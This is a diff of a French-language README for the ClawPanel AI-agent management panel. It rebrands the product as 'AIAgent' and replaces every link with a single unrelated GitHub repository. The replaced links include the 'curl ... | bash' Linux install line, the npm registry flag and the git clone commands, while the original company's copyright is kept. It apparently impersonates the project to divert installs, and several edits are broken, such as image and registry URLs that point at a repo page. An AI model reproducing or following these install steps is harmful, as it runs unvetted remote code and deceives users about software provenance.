@@ -1,5 +1,5 @@
 <p align="center">
-  <img src="public/images/logo-brand.png" width="360" alt="ClawPanel">
+  <img src="public/images/logo-brand.png" width="360" alt="AIAgent">
 </p>
 
 <p align="center">
@@ -11,33 +11,33 @@
 </p>
 
 <p align="center">
-  <a href="https://github.com/qingchencloud/clawpanel/releases/latest">
-    <img src="https://img.shields.io/github/v/release/qingchencloud/clawpanel?style=flat-square&color=6366f1" alt="Release">
+  <a href="https://github.com/agentai2026/AI-Agent">
+    <img src="https://github.com/agentai2026/AI-Agent" alt="Release">
   </a>
-  <a href="https://github.com/qingchencloud/clawpanel/releases/latest">
-    <img src="https://img.shields.io/github/downloads/qingchencloud/clawpanel/total?style=flat-square&color=8b5cf6" alt="Downloads">
+  <a href="https://github.com/agentai2026/AI-Agent">
+    <img src="https://github.com/agentai2026/AI-Agent" alt="Downloads">
   </a>
-  <a href="https://github.com/qingchencloud/clawpanel/blob/main/LICENSE">
-    <img src="https://img.shields.io/badge/license-AGPL--3.0-blue.svg?style=flat-square" alt="License">
+  <a href="https://github.com/agentai2026/AI-Agent">
+    <img src="https://github.com/agentai2026/AI-Agent" alt="License">
   </a>
 </p>
 
 ---
 
 <p align="center">
-  <img src="docs/feature-showcase.gif" width="800" alt="ClawPanel Showcase">
+  <img src="docs/feature-showcase.gif" width="800" alt="AIAgent Showcase">
 </p>
 
-ClawPanel est un panneau de gestion visuel supportant plusieurs frameworks d'agents IA, actuellement avec un double support pour [OpenClaw](https://github.com/1186258278/OpenClawChineseTranslation) et [Hermes Agent](https://github.com/nousresearch/hermes-agent). Il intègre un **assistant IA intelligent** qui vous aide à installer, diagnostiquer automatiquement les configurations, résoudre les problèmes et corriger les erreurs. 8 outils + 4 modes + Q&A interactif — facile à gérer pour débutants et experts.
+AIAgent est un panneau de gestion visuel supportant plusieurs frameworks d'agents IA, actuellement avec un double support pour [OpenClaw](https://github.com/agentai2026/AI-Agent) et [Hermes Agent](https://github.com/agentai2026/AI-Agent). Il intègre un **assistant IA intelligent** qui vous aide à installer, diagnostiquer automatiquement les configurations, résoudre les problèmes et corriger les erreurs. 8 outils + 4 modes + Q&A interactif — facile à gérer pour débutants et experts.
 
-> 🌐 **Site web** : [claw.qt.cool](https://claw.qt.cool/) | 📦 **Télécharger** : [GitHub Releases](https://github.com/qingchencloud/clawpanel/releases/latest)
+> 🌐 **Site web** : [claw.qt.cool](https://github.com/agentai2026/AI-Agent) | 📦 **Télécharger** : [GitHub Releases](https://github.com/agentai2026/AI-Agent)
 
 ### 🎁 QingchenCloud AI API
 
 > Plateforme interne de tests techniques, ouverte à certains utilisateurs. Connectez-vous quotidiennement pour gagner des crédits.
 
 <p align="center">
-  <a href="https://gpt.qt.cool"><img src="https://img.shields.io/badge/🔑 QingchenCloud AI-gpt.qt.cool-6366f1?style=for-the-badge" alt="QingchenCloud AI"></a>
+  <a href="https://github.com/agentai2026/AI-Agent"><img src="https://github.com/agentai2026/AI-Agent QingchenCloud AI-gpt.qt.cool-6366f1?style=for-the-badge" alt="QingchenCloud AI"></a>
 </p>
 
 - **Crédits de connexion quotidienne** — Connexion quotidienne + invitation d'amis pour gagner des crédits de test
@@ -59,11 +59,11 @@ ClawPanel est un panneau de gestion visuel supportant plusieurs frameworks d'age
 Une communauté de développeurs et d'enthousiastes passionnés par les agents IA — rejoignez-nous !
 
 <p align="center">
-  <a href="https://discord.gg/U9AttmsNHh"><strong>Discord</strong></a>
+  <a href="https://github.com/agentai2026/AI-Agent"><strong>Discord</strong></a>
   &nbsp;·&nbsp;
-  <a href="https://github.com/qingchencloud/clawpanel/discussions"><strong>Discussions</strong></a>
+  <a href="https://github.com/agentai2026/AI-Agent"><strong>Discussions</strong></a>
   &nbsp;·&nbsp;
-  <a href="https://github.com/qingchencloud/clawpanel/issues/new"><strong>Signaler un Issue</strong></a>
+  <a href="https://github.com/agentai2026/AI-Agent"><strong>Signaler un Issue</strong></a>
 </p>
 
 ## Fonctionnalités
@@ -90,7 +90,7 @@ Une communauté de développeurs et d'enthousiastes passionnés par les agents I
 
 ## Télécharger et installer
 
-Rendez-vous sur [Releases](https://github.com/qingchencloud/clawpanel/releases/latest) pour la dernière version :
+Rendez-vous sur [Releases](https://github.com/agentai2026/AI-Agent) pour la dernière version :
 
 | Plateforme | Installateur |
 |-----------|-------------|
@@ -102,7 +102,7 @@ Rendez-vous sur [Releases](https://github.com/qingchencloud/clawpanel/releases/l
 ### Serveur Linux (Version Web)
 
 ```bash
-curl -fsSL https://raw.githubusercontent.com/qingchencloud/clawpanel/main/scripts/linux-deploy.sh | bash
+curl -fsSL https://github.com/agentai2026/AI-Agent | bash
 ```
 
 ### Docker
@@ -112,8 +112,8 @@ docker run -d --name clawpanel --restart unless-stopped \
   -p 1420:1420 -v clawpanel-data:/root/.openclaw \
   node:22-slim \
   sh -c "apt-get update && apt-get install -y git && \
-    npm install -g @qingchencloud/openclaw-zh --registry https://registry.npmmirror.com && \
-    git clone https://github.com/qingchencloud/clawpanel.git /app && \
+    npm install -g @qingchencloud/openclaw-zh --registry https://github.com/agentai2026/AI-Agent && \
+    git clone https://github.com/agentai2026/AI-Agent /app && \
     cd /app && npm install && npm run build && npm run serve"
 ```
 
@@ -136,7 +136,7 @@ docker run -d --name clawpanel --restart unless-stopped \
 ## Compiler depuis les sources
 
 ```bash
-git clone https://github.com/qingchencloud/clawpanel.git
+git clone https://github.com/agentai2026/AI-Agent
 cd clawpanel && npm install
 
 # Bureau (nécessite Rust + Tauri v2)
@@ -152,9 +152,9 @@ npm run build && npm run serve  # Production
 
 | Projet | Description |
 |--------|-------------|
-| [OpenClaw](https://github.com/1186258278/OpenClawChineseTranslation) | Framework d'agents IA |
-| [ClawApp](https://github.com/qingchencloud/clawapp) | Client mobile multiplateforme |
-| [cftunnel](https://github.com/qingchencloud/cftunnel) | Outil Cloudflare Tunnel |
+| [OpenClaw](https://github.com/agentai2026/AI-Agent) | Framework d'agents IA |
+| [ClawApp](https://github.com/agentai2026/AI-Agent) | Client mobile multiplateforme |
+| [cftunnel](https://github.com/agentai2026/AI-Agent) | Outil Cloudflare Tunnel |
 
 ## Contribuer
 
@@ -174,11 +174,11 @@ If you find this project useful, consider supporting us via USDT (BNB Smart Chai
 ## Contact
 
 - **Email**: [support@qctx.net](mailto:support@qctx.net)
-- **Website**: [qingchencloud.com](https://qingchencloud.com)
-- **Product**: [claw.qt.cool](https://claw.qt.cool)
+- **Website**: [qingchencloud.com](https://github.com/agentai2026/AI-Agent)
+- **Product**: [claw.qt.cool](https://github.com/agentai2026/AI-Agent)
 
 ## Licence
 
 [AGPL-3.0](LICENSE). Contactez-nous pour une licence commerciale.
 
-© 2026 QingchenCloud | [claw.qt.cool](https://claw.qt.cool)
+© 2026 QingchenCloud | [claw.qt.cool](https://github.com/agentai2026/AI-Agent)
